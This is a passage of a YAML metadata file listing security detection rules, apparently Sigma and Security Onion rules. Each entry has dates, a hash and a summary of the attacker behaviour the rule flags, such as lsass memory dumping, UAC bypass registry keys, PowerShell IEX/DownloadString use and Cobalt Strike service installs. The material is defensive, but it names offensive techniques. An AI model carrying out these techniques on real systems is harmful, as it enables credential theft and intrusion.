    using a zero-day exploit, as detailed by Microsoft in connection to CVE-2021-35211.
  Updated-Date: '2024_09_03'
58f50261-c53b-4c88-bd12-1d71f12eda4c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f6ebda15f56e496b70d24fdbdca2586c
  Ruleset: sigmahq
  Summary: This rule detects the use of the native Windows utility VaultCmd.exe to
    list credentials currently stored in Windows Credential Manager. By monitoring
    the process creation for instances where VaultCmd.exe is executed and includes
    the command line parameter '/listcreds:', this rule identifies potential credential
    access activities which may be indicative of malicious behavior.
  Updated-Date: '2024_09_04'
58f88172-a73d-442b-94c9-95eaed3cbb36:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c300e9d37520a85d32c57428383cd155
  Ruleset: sigmahq
  Summary: This rule detects the addition of a new Federated Domain within Microsoft
    365 audit logs. It identifies operations that specifically include keywords like
    'add' or 'new' in relation to domain activities. While the creation of a new Federated
    domain is not inherently malicious, such events should be monitored closely, as
    they may indicate potential abuse of federated credentials or backdoor activities
    involving federated identities possibly across different cloud providers.
  Updated-Date: '2024_09_04'
590a5f4c-6c8c-4f10-8307-89afe9453a9d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 62d79562aaff66cfadaff1cb1f4f37ae
  Ruleset: core
  Summary: This rule detects instances where child processes are created with SYSTEM
    level privileges by parent processes running under LOCAL SERVICE or NETWORK SERVICE
    accounts. This is often indicative of a privilege escalation attempt. Specifically,
    the rule monitors process creation events for signs that the originating process
    has a lower privilege level, such as LOCAL SERVICE or NETWORK SERVICE, and the
    resulting process is elevated to SYSTEM level. This behavior can be exploited
    by various tools and methods as part of a privilege escalation attack. The rule
    also includes a filter to exclude legitimate uses of certain processes, such as
    'rundll32.exe' invoking 'DavSetCookie', to reduce false positives.
  Updated-Date: '2024_09_03'
5947497f-1aa4-41dd-9693-c9848d58727d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 95bdbd129c5197d94fc06a6ee32c66ee
  Ruleset: sigmahq
  Summary: This rule detects the use of the Unblock-File command to remove the Zone.Identifier
    alternate data stream from files, which indicates that the files were downloaded
    from the internet. The removal of this marker can be employed as an evasion tactic
    to prevent security tools from recognizing and blocking potentially harmful files.
    The detection relies on identifying PowerShell scripts that include the 'Unblock-File'
    command alongside the '-Path' parameter, which specifies the file to be unblocked.
    While this activity can be a part of legitimate PowerShell script usage, it is
    also commonly associated with defense evasion techniques.
  Updated-Date: '2024_09_04'
59e938ff-0d6d-4dc3-b13f-36cc28734d4e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0090537e32d33dfd99776da4513b2480
  Ruleset: sigmahq
  Summary: This rule detects code execution using Pester.bat, a PowerShell module
    designed for testing purposes. It identifies suspicious activity by monitoring
    the creation of processes involving PowerShell or cmd.exe, specifically looking
    for commands associated with Pester and the 'Get-Help' function. The rule aims
    to flag instances where Pester is used potentially for malicious purposes while
    acknowledging that legitimate use of Pester in writing tests for PowerShell scripts
    and modules may trigger false positives.
  Updated-Date: '2024_09_04'
59ec40bb-322e-40ab-808d-84fa690d7e56:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bdc9eaa0b2bb434c80c8797bef655d13
  Ruleset: core
  Summary: This rule detects the occurrence of a core dump from a crashing Nginx worker
    process. Core dumps are indicative of severe issues or potential exploitation
    attempts. This may signify either a serious problem within the Nginx configuration
    or with one of its plugins.
  Updated-Date: '2024_09_03'
5a105d34-05fc-401e-8553-272b45c1522d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 591113ecd88a895909e622d17efa19f8
  Ruleset: core
  Summary: This rule detects malicious service installs associated with Cobalt Strike,
    a penetration testing tool commonly used by attackers for privilege escalation
    and lateral movement. It identifies instances where the Service Control Manager
    logs an Event ID 7045, indicating a service installation. Suspicious indicators
    include service image paths containing 'ADMIN$' and '.exe', or those involving
    the command prompt and PowerShell commands, particularly with hidden windows and
    encoded commands. Additionally, it flags any service image paths that match a
    specific base64 encoded pattern referencing PowerShell downloading scripts from
    a local web server.
  Updated-Date: '2024_09_03'
5a2b21ee-6aaa-4234-ac9d-59a59edf90a1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b08d5b56ec7d74d5232ad5ce1768f8d6
  Ruleset: sigmahq
  Summary: This rule detects when an attacker registers a new SIP (Software Integrity
    Policies) provider within the Windows registry, a technique often employed for
    persistence and defense evasion. The detection focuses on changes to specific
    registry paths associated with cryptographic providers and encoding types. Legitimate
    SIP providers such as WINTRUST.DLL and mso.dll are excluded from the detection
    to reduce false positives. This activity can indicate a malicious attempt to subvert
    the Windows trust model by integrating unauthorized or malicious SIP providers.
  Updated-Date: '2024_09_04'
5a3164f2-b373-4152-93cf-090b13c12d27:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b5d930e668bdefa4595c276abb23cb26
  Ruleset: sigmahq
  Summary: This rule detects uncommon or suspicious child processes originating from
    a Visual Studio Code (VsCode) "code.exe" process. Such activity could suggest
    attempts to establish persistence through VsCode tasks or terminal profiles. It
    identifies child processes like 'calc.exe,' 'regsvr32.exe,' 'rundll32.exe,' 'cscript.exe,'
    'wscript.exe,' 'powershell.exe,' 'pwsh.exe,' and 'cmd.exe' especially when they
    involve commands associated with potentially harmful activities, including 'Invoke-Expressions,'
    'IEX,' 'Invoke-Command,' 'ICM,' 'DownloadString,' 'rundll32,' 'regsvr32,' 'wscript,'
    and 'cscript.' Additionally, it looks for child processes executing from suspicious
    file paths like public user directories, Windows Temp directories, and general
    Temp directories, to flag potential threats.
  Updated-Date: '2024_09_04'
5a35116f-43bc-4901-b62d-ef131f42a9af:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 68e64236a3cd21529fbe668f395e1fe8
  Ruleset: emerging-threats
  Summary: This rule detects attempts to exploit CVE-2020-10148, a vulnerability in
    the SolarWinds Orion API that allows for authentication bypass. The rule identifies
    specific patterns in web server query strings that are indicative of the exploit,
    such as references to 'WebResource.axd', 'ScriptResource.axd', and '/SolarWinds/api/'.
    It also differentiates between valid and malicious requests by filtering out legitimate
    query patterns, like 'Orion/Skipi18n/Profiler/'. This detection is crucial for
    identifying unauthorized access attempts leveraging the mentioned vulnerability.
  Updated-Date: '2024_09_03'
5a365a62-7d5a-4d80-8435-488380dec0e2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 575e448126ad19899e02a7dcd0c1fcc6
  Ruleset: securityonion-resources
  Summary: This rule detects an attempt to log in via an HTTP Proxy on a Security
    Onion Intrusion Detection Honeypot (IDH) node. The detection focuses on a specific
    log type indicating a proxy login attempt, which can help identify unauthorized
    access or potential malicious activity targeting the proxy service.
  Updated-Date: '2024_08_07'
5a44727c-3b85-4713-8c44-4401d5499629:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5537d7a701f65af69fa2643916cc6c75
  Ruleset: core
  Summary: This rule detects a possible Kerberos Replay Attack on domain controllers
    when a "KRB_AP_ERR_REPEAT" Kerberos response is sent to the client. The detection
    is triggered by the presence of Security Event ID 4649, indicating a potential
    attempt to reuse Kerberos tickets to authenticate repeatedly. Such activity is
    typically associated with credential access and specific attack techniques.
  Updated-Date: '2024_09_03'
5a5152f1-463f-436b-b2f5-8eceb3964b42:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fde9d7d7cc898b228ff849d53dfa3003
  Ruleset: sigmahq
  Summary: This rule detects modifications to the "Hidden" and "ShowSuperHidden" explorer
    registry values that disable the display of hidden and system files. This technique
    is commonly exploited by various malware families to conceal their files from
    ordinary users.
  Updated-Date: '2024_09_04'
5a6e1e16-07de-48d8-8aae-faa766c05e88:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 48f5d9d2915b29c0de52ad604f9744f3
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "curl.exe" command with the "-c"
    flag, which is used to save cookie data. Curl is a command-line tool for transferring
    data with URLs, and the presence of this flag indicates an attempt to store cookies,
    potentially suggesting session hijacking activities.
  Updated-Date: '2024_09_04'
5a93eb65-dffa-4543-b761-94aa60098fb6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ef8f4cc1d3ffea84b1b21ad1f4d70ddb
  Ruleset: sigmahq
  Summary: This rule detects registry modifications intended to hide internal tools
    or functions from the user, a technique often used by malware such as Agent Tesla
    and Hermetic Wiper. Specifically, it monitors changes to certain registry paths
    and values related to user interface elements like the clock, system health, network,
    power, and volume icons, as well as Explorer tips and compression color settings.
    Such modifications are typically indicative of efforts to conceal malicious activities
    by altering visible settings in the Windows operating system.
  Updated-Date: '2024_09_04'
5aad0995-46ab-41bd-a9ff-724f41114971:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f71ce769a4dcc821ade67b32ccda50cb
  Ruleset: core
  Summary: This rule detects the initialization and processing of the volume shadow
    copy service via the esentutl utility. It monitors for specific registry keys,
    such as HKLM\System\CurrentControlSet\Services\VSS\Diag\VolSnap\Volume, to identify
    this activity. The detection focuses on events where the target object contains
    'System\CurrentControlSet\Services\VSS' and the executable image ends with 'esentutl.exe'.
  Updated-Date: '2024_09_03'
5aecf3d5-f8a0-48e7-99be-3a759df7358f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a67e4431f362571e5e61fdb95aea4db5
  Ruleset: core
  Summary: This rule detects when an administrator grants application permissions
    (app roles) or highly privileged delegated permissions in Azure, as evidenced
    by audit logs that contain messages indicating the addition of app role assignments
    to service principals. This action can be indicative of potential persistence
    or privilege escalation tactics and aligns with relevant attack techniques.
  Updated-Date: '2024_09_03'
5afa454e-030c-4ab4-9253-a90aa7fcc581:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2538daada5e1d3ed284c8e6cef087d2d
  Ruleset: sigmahq
  Summary: This rule detects device registration or join events within Azure environments
    where Multi-Factor Authentication (MFA) was not performed, even though the conditional
    access status showed as successful. It focuses on monitoring logs from the Device
    Registration Service to ensure that MFA requirements are enforced and alerts when
    these security measures are bypassed.
  Updated-Date: '2024_09_04'
5afee48e-67dd-4e03-a783-f74259dcf998:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 88648fcee62df3eb73879270d427c0bb
  Ruleset: core
  Summary: This rule detects suspicious uses of the SysInternals Procdump utility
    by identifying specific command line parameters used in conjunction with the lsass.exe
    process. The rule captures instances where Procdump, potentially renamed by an
    attacker, is employed for dumping memory from the lsass.exe process. This detection
    can help identify attempts to access sensitive information stored in the Local
    Security Authority Subsystem Service (LSASS) process.
  Updated-Date: '2024_09_03'
5b16df71-8615-4f7f-ac9b-6c43c0509e61:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2c706072e5f18d6dc5e50bad040cfcec
  Ruleset: core
  Summary: This rule detects when the "index" value of a scheduled task is modified
    within the Windows registry. The modification hides the task from administrative
    tools such as "schtasks /query." This can be indicative of an attempt to evade
    detection by tampering with system records, making the task invisible to users
    and various inspection tools. The rule monitors specific registry paths and values
    to identify such alterations, which are typically used in defense-evasion tactics.
  Updated-Date: '2024_09_03'
5b175490-b652-4b02-b1de-5b5b4083c5f8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 23baf158276b4f68620cae7aa8ddcd0c
  Ruleset: core
  Summary: This rule detects registry manipulations related to the RedMimicry Winnti
    playbook. RedMimicry Winnti is associated with the Winnti malware, known for its
    advanced persistent threat (APT) capabilities used in espionage and data theft.
    Specifically, the rule identifies changes to the registry key path 'HKLM\SOFTWARE\Microsoft\HTMLHelp\data',
    which could indicate attempts at defense evasion by altering system configurations
    or storing data in obscure registry locations.
  Updated-Date: '2024_09_03'
5b2bbc47-dead-4ef7-8908-0cf73fcbecbf:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2c49e7cf4687f2a7b3a7b148d8b4b0bb
  Ruleset: core
  Summary: This rule detects attempts to exploit the vulnerability CVE-2021-1675,
    known as PrintNightmare, by identifying the deletion of DLL files from the Spooler
    Service driver folder. This activity is indicative of an exploitation attempt
    targeting the Windows Print Spooler service.
  Updated-Date: '2024_09_03'
5b40a734-99b6-4b98-a1d0-1cea51a08ab2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1c0d261ccf5430809436106424a2f11c
  Ruleset: core
  Summary: This rule detects the creation of specific files that indicate the interactive
    use of PowerShell in the SYSTEM user context on Windows systems. The targeted
    filenames suggest the use of PowerShell history and startup profile data by the
    SYSTEM user. Detection of these filenames could potentially point to malicious
    activities such as the execution of PowerSploit's Invoke-Mimikatz script, often
    associated with credential dumping and lateral movement.
  Updated-Date: '2024_09_03'
5b768e71-86f2-4879-b448-81061cbae951:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 80bf660723f9dfa676f2949a35c5a881
  Ruleset: core
  Summary: This rule detects suspicious manipulations of default accounts such as
    'administrator' and 'guest' on Windows systems via the use of the net.exe or net1.exe
    commands. It monitors command lines that include language-specific terms for 'administrator'
    and 'guest' accounts, as well as various ways these commands may appear when attackers
    use cmd.exe. The rule aims to identify actions like enabling, disabling, or changing
    the passwords of these default accounts, which can be indicative of malicious
    activity such as preparation for further attacks or lateral movement.
  Updated-Date: '2024_09_03'
5b80a791-ad9b-4b75-bcc1-ad4e1e89c200:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ec38d283e0bd058cb55550dd29011b7a
  Ruleset: core
  Summary: This rule detects the usage of bitsadmin.exe to download files with suspicious
    extensions on Windows systems. Bitsadmin, a command-line tool for managing Background
    Intelligent Transfer Service (BITS) jobs, can be exploited for malicious purposes.
    The rule specifically looks for command lines containing keywords like '/transfer,'
    '/create,' or '/addfile,' along with file extensions such as '.7z,' '.asax,' '.dll,'
    '.ps1,' '.rar,' and numerous others that are often associated with potentially
    harmful files or scripts. Monitoring these patterns helps in identifying attempts
    at defense evasion and persistence by malicious actors.
  Updated-Date: '2024_09_03'
5b872a46-3b90-45c1-8419-f675db8053aa:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 78af16f7bfb51134b97f33a73999d382
  Ruleset: core
  Summary: This rule detects attempts to bypass User Account Control (UAC) on Windows
    systems by manipulating registry keys associated with `sdclt.exe`. Such a technique
    can elevate privileges without the user's consent or knowledge. Notably, registry
    paths targeted for manipulation include `Software\Classes\exefile\shell\runas\command\isolatedCommand`
    and `Software\Classes\Folder\shell\open\command\SymbolicLinkValue`, which indicate
    an effort to exploit these keys for unauthorized actions, often employing tools
    like UACMe 53.
  Updated-Date: '2024_09_03'
5ba243e5-8165-4cf7-8c69-e1d3669654c1:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 87821c05c3ef7c9a49fa9a2d4483b4d3
  Ruleset: sigmahq
  Summary: This rule detects potential DLL sideloading of "MpSvc.dll," which is associated
    with Windows Defender. DLL sideloading is a technique used to execute malicious
    code by tricking legitimate applications into loading a malicious DLL. This rule
    monitors for the loading of MpSvc.dll from locations outside the typical Windows
    Defender directories, helping to identify attempts to use this technique for defense
    evasion.
  Updated-Date: '2024_09_04'
5ba715b6-71b7-44fd-8245-f66893e81b3d:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 19bc4d635004272339a4b42dc303a395
  Ruleset: emerging-threats
  Summary: This rule detects a suspicious user agent string associated with the APT40
    Dropbox tool, a tool used in cyber espionage operations. By identifying traffic
    with the specific user agent 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36
    (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36' combined with connections
    to 'api.dropbox.com,' the rule aims to flag potential command-and-control activity
    and possible data exfiltration involving the APT40 group. The detection addresses
    concerns about unusual or legacy software behavior that could indicate malicious
    use of Dropbox as a communication or exfiltration channel by the APT40 threat
    actors.
  Updated-Date: '2024_09_03'
5bb68627-3198-40ca-b458-49f973db8752:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dfcb584ae74f1e8e6f429189b3464dfc
  Ruleset: core
  Summary: This rule detects the execution of rundll32.exe without parameters, which
    can indicate the use of the Metasploit windows/smb/psexec exploit module, typically
    associated with lateral movement and execution tactics. The rule monitors for
    instances where rundll32.exe is executed without any arguments by analyzing process
    creation logs in Windows environments. False positives may occur if a user manually
    executes rundll32.exe from the command line without specifying options.
  Updated-Date: '2024_09_03'
5bed80b6-b3e8-428e-a3ae-d3c757589e41:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cef911aaaced9c8f26b4994be8905295
  Ruleset: core
  Summary: This rule detects the use of the Windows process 'svchost' hosting Remote
    Desktop Protocol (RDP) TermServices (termsvcs) which is communicating with the
    loopback address (127.* or ::1). This behavior indicates the probable establishment
    of an RDP connection over a reverse SSH tunnel. The rule focuses on identifying
    events with EventID 5156, combined with specific source and destination port parameters
    (port 3389 for RDP) associated with loopback addresses. Exceptions to this detection
    include applications originating from an AppContainer Loopback or known benign
    processes like 'thor.exe' or 'thor64.exe'.
  Updated-Date: '2024_09_03'
5c80b618-0dbb-46e6-acbb-03d90bcb6d83:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 073539ba852b54703e51ab29959b3b93
  Ruleset: sigmahq
  Summary: This rule detects a network connection initiated by a non-browser process
    to "azurewebsites.net" on a Windows system. The domain "azurewebsites.net" has
    been frequently used by threat actors as a site for malware hosting and data exfiltration,
    making such connections suspicious. The rule excludes connections made by typical
    browser processes such as Chrome, Firefox, Internet Explorer, Edge, Safari, and
    other common browsers to prevent false positives.
  Updated-Date: '2024_09_04'
5c82f0b9-3c6d-477f-a318-0e14a1df73e0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 080dc75ac396fc66d74c0372e96d0978
  Ruleset: sigmahq
  Summary: This rule detects when a security threat is identified in Okta. The detection
    is based on specific event types related to security threats. This is designed
    to enhance threat monitoring and ensure swift response to potential command-and-control
    activities within the Okta environment.
  Updated-Date: '2024_09_04'
5c84856b-55a5-45f1-826f-13f37250cf4e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ddc2cf7eb30d32b424f3189dd73731da
  Ruleset: core
  Summary: This rule detects suspicious user agent strings in proxy logs that are
    commonly associated with various types of malware and remote access tools (RATs).
    It identifies user agents such as "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:53.0)
    Gecko/20100101 Chrome/53.0" linked to DragonOK, "Mozilla/4.0 (compatible; MSIE
    8.0; Windows NT 5.1)" used by PlugX, and "HttpBrowser/1.0" associated with HTTPBrowser
    RAT. The rule targets strings used by well-known malware including ZeroAccess,
    Dyre, Upatre, and various Trojan downloaders. It also covers malware like Kazy,
    Renos.Downloader, and MacControl, as well as stealer malware like Racoon Stealer
    and trojans such as Fareit and Pony. Additionally, the rule captures user agents
    connected to specific malware campaigns and tools like Loki Bot, Emotet, Lockbit,
    Ursnif, and Zebrocy, along with stealer malware such as Lilith Stealer, BunnyStealer,
    and SparkRAT. The rule aims to identify and flag these suspicious activities to
    prevent potential infections and breaches within the network.
  Updated-Date: '2024_09_03'
5cb299fc-5fb1-4d07-b989-0644c68b6043:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 96a1a9cfaf70944d5f70ce3fc0c96e7f
  Ruleset: core
  Summary: This rule detects potentially suspicious file downloads directly from IP
    addresses using curl.exe on Windows systems. It identifies instances where curl.exe
    is invoked to download files from specific IP addresses rather than domain names,
    with command-line entries including patterns like "http" and parameters such as
    '-O', '--remote-name', or '--output' which denote file-saving actions. The rule
    further filters these downloads by looking for file extensions commonly associated
    with executable, script, and image files including but not limited to .exe, .dll,
    .bat, .ps1, and .png.
  Updated-Date: '2024_09_03'
5cc2cda8-f261-4d88-a2de-e9e193c86716:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1e0c46087d5b92593ab215f8a175b12d
  Ruleset: core
  Summary: This rule detects suspicious processes spawned by the Windows Remote Management
    (WinRM) host process, `wsmprovhost.exe`. It identifies specific command interpreters
    and utilities such as `cmd.exe`, `sh.exe`, `bash.exe`, `powershell.exe`, `pwsh.exe`,
    `wsl.exe`, `schtasks.exe`, `certutil.exe`, `whoami.exe`, and `bitsadmin.exe` as
    suspicious if they are initiated by WinRM. This behavior is often associated with
    unauthorized access or administrative activity indicative of potential malicious
    actions like persistence or privilege escalation.
  Updated-Date: '2024_09_03'
5cc90652-4cbd-4241-aa3b-4b462fa5a248:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 222077b5ed5e51b1cd8057567e00a6f6
  Ruleset: sigmahq
  Summary: This rule detects the use of `nltest.exe`, a command-line tool for network
    administrators in Windows, which may indicate reconnaissance activity for information
    discovery. Specific command-line arguments such as 'server', 'query', '/user',
    'all_trusts', 'dclist:', 'dnsgetdc:', 'domain_trusts', 'dsgetdc:', 'parentdomain',
    and 'trusted_domains' are monitored to identify potentially malicious use. Although
    these commands can be used legitimately for network administration tasks, their
    presence warrants further investigation to rule out malicious intent.
  Updated-Date: '2024_09_04'
5cdb711b-5740-4fb2-ba88-f7945027afac:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 16874d65c1763ec7980ff121bae862a4
  Ruleset: core
  Summary: This rule detects the execution of rundll32.exe where the DLL being executed
    is located on a remote network share. This activity may indicate an attempt at
    defense evasion or the execution of malicious code by leveraging a trusted Windows
    utility. By monitoring process creation logs on Windows systems, the rule identifies
    instances where rundll32.exe is invoked with a command line pointing to a UNC
    path, which is unusual for legitimate usage and often associated with malicious
    activity.
  Updated-Date: '2024_09_03'
5cdbc2e8-86dd-43df-9a1a-200d4745fba5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2c049b35373c664b6c401e556b67252e
  Ruleset: emerging-threats
  Summary: This rule detects the execution of Rundll32.exe to launch an NSIS (Nullsoft
    Scriptable Install System) module associated with the Rhadamanthys infostealer.
    Rhadamanthys is a type of malware primarily involved in stealing sensitive information.
    Specifically, this detection focuses on identifying instances where Rundll32.exe
    is used to invoke the NSIS module with stealer capabilities, pinpointing malware
    behaviors reported and sampled in early 2023.
  Updated-Date: '2024_09_03'
5cddf373-ef00-4112-ad72-960ac29bac34:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a574af885fe33f4c98a8db4b4239bed8
  Ruleset: core
  Summary: This rule detects the execution of command-line parameters associated with
    the Koadic hack tool, which is known for utilizing COM-based methods to perform
    various malicious activities. It specifically monitors processes created by cmd.exe
    that include the '/q', '/c', and 'chcp' parameters in the command line, indicative
    of Koadic's operational behavior.
  Updated-Date: '2024_09_03'
5cdeaf3d-1489-477c-95ab-c318559fc051:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 04f119080c02a22d70da91b16c071f88
  Ruleset: core
  Summary: This rule detects an AppX package added to the pipeline of "to be processed"
    packages that are located in suspicious locations. Such locations include directories
    like Public, PerfLogs, Desktop, Downloads, Windows Temp, and Local Temp files.
    AppX packages found in these directories may indicate malicious activity or attempted
    malware deployment through unconventional paths.
  Updated-Date: '2024_09_03'
5cdeb555-65de-4767-99fe-e26807465148:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 855763b287215e9782e2b6a75b48769f
  Ruleset: emerging-threats
  Summary: This rule detects the creation of a custom protocol handler named "rogue"
    in the Windows registry. This activity is associated with the Forest Blizzard
    APT group and has been reported by Microsoft. The creation of such protocol handlers
    indicates an attempt to establish persistence mechanisms by defining how certain
    URLs (under the custom protocol "rogue") should be processed by the operating
    system. The specific details in the registry include a target object containing
    '\PROTOCOLS\\Handler\rogue\CLSID' and a particular CLSID value, which aligns with
    the behavior observed in post-compromise tools employed by this APT to exploit
    vulnerabilities and obtain credentials.
  Updated-Date: '2024_09_03'
5ce0f04e-3efc-42af-839d-5b3a543b76c0:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c4bb20121e8fdf05cbb01d9604d7205a
  Ruleset: sigmahq
  Summary: This rule detects process execution from a fake recycle bin folder, which
    is often employed by threat actors to evade security solutions. The rule identifies
    processes that originate from directories with names resembling recycle bin paths,
    such as 'RECYCLERS.BIN\' or 'RECYCLER.BIN\'. This tactic is linked to techniques
    related to persistence and defense evasion.
  Updated-Date: '2024_09_04'
5d0fdb62-f225-42fb-8402-3dfe64da468a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 34bcc46c4b1ffd5411662e3780f03860
  Ruleset: sigmahq
  Summary: This rule detects attempts to create and/or add an account to the admin
    group on macOS using the dseditgroup utility, which grants administrative privileges.
    It monitors for specific process creation patterns that include the dseditgroup
    command with options for editing operations, username specifications, user type,
    and targeting the admin group.
  Updated-Date: '2024_09_04'
5d52bf82-19f8-4f18-9bc6-e1d6bdc1872f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 95fd5c28055cda0676625e6bc48fc173
  Ruleset: securityonion-resources
  Summary: This rule detects when there is a login attempt to the VNC service on a
    Security Onion Intrusion Detection Honeypot (IDH) node.
  Updated-Date: '2024_08_07'
5d756aee-ad3e-4306-ad95-cb1abec48de2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7163b563666f4aaf5c42c1c744510e36
  Ruleset: sigmahq
  Summary: This rule detects temporary installation artifacts of GoToAssist, a legitimate
    desktop support and remote access software. Adversaries may use such software,
    including GoToAssist, TeamViewer, LogMeIn, and AmmyyAdmin, to establish an interactive
    command and control channel within target systems. These tools are often permitted
    in target environments due to their common use for technical support. The rule
    identifies files in a specific directory path associated with the GoToAssist Remote
    Support Expert, signaling potential misuse for unauthorized remote access.
  Updated-Date: '2024_09_04'
5daf11c3-022b-4969-adb9-365e6c078c7c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7fcd35a500efa6ec5222fadcafe594c6
  Ruleset: core
  Summary: This rule detects block events for files that are disallowed by code integrity
    specifically for protected processes on Windows systems. This is identified through
    Event ID 3104, which indicates that Windows has blocked a file that has been deemed
    disallowed for such processes. The occurrence of this event suggests an attempted
    violation of code integrity policies designed to protect sensitive processes,
    often associated with privilege escalation attempts.
  Updated-Date: '2024_09_03'
5de03871-5d46-4539-a82d-3aa992a69a83:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5a90c003aa58b6d00ad9fdb064ea8257
  Ruleset: core
  Summary: This rule detects the modification of the Windows registry specifically
    targeting keys and values associated with disabling system restore functionality.
    The identified registry paths include '\Policies\Microsoft\Windows NT\SystemRestore'
    and '\Microsoft\Windows NT\CurrentVersion\SystemRestore', focusing on entries
    such as 'DisableConfig' and 'DisableSR' set to 'DWORD (0x00000001)'. This action
    is typically indicative of attempts to prevent the use of system restore points,
    which could be employed by attackers to impede recovery efforts following a malicious
    operation.
  Updated-Date: '2024_09_03'
5de06a6f-673a-4fc0-8d48-bcfe3837b033:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4f830a2f4ed08e9f6f9dc0e81f97484a
  Ruleset: sigmahq
  Summary: This rule detects the use of the "sw_vers" command on macOS systems for
    gathering system information. The "sw_vers" command is used to retrieve macOS
    version details, such as the build version, product name, and product version.
    This type of activity is associated with system information discovery, which may
    be part of legitimate administrative tasks or malicious reconnaissance efforts
    by attackers.
  Updated-Date: '2024_09_04'
5de632bc-7fbd-4c8a-944a-fce55c59eae5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6b025c1cdc36d032cb378dc81cca9004
  Ruleset: emerging-threats
  Summary: This rule detects process command line patterns and specific file locations
    associated with the REvil ransomware group during the Kaseya incident. It identifies
    suspicious command lines that include paths like 'C:\Windows\cert.exe', and 'C:\kworking1\agent.exe',
    as well as malicious activities such as deleting files with the 'del /q /f' command
    and directory removal commands targeting system logs. The rule also monitors for
    specific image files such as 'C:\Windows\MsMpEng.exe' and 'C:\kworking\agent.exe',
    which are indicative of REvil's operations. This detection is critical as it highlights
    potentially harmful behaviors related to the Kaseya supply chain attack, which
    delivered ransomware to multiple companies through malicious updates.
  Updated-Date: '2024_09_03'
5df86130-4e95-4a54-90f7-26541b40aec2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2e4d548857f0c178360bfb54d99b70a8
  Ruleset: sigmahq
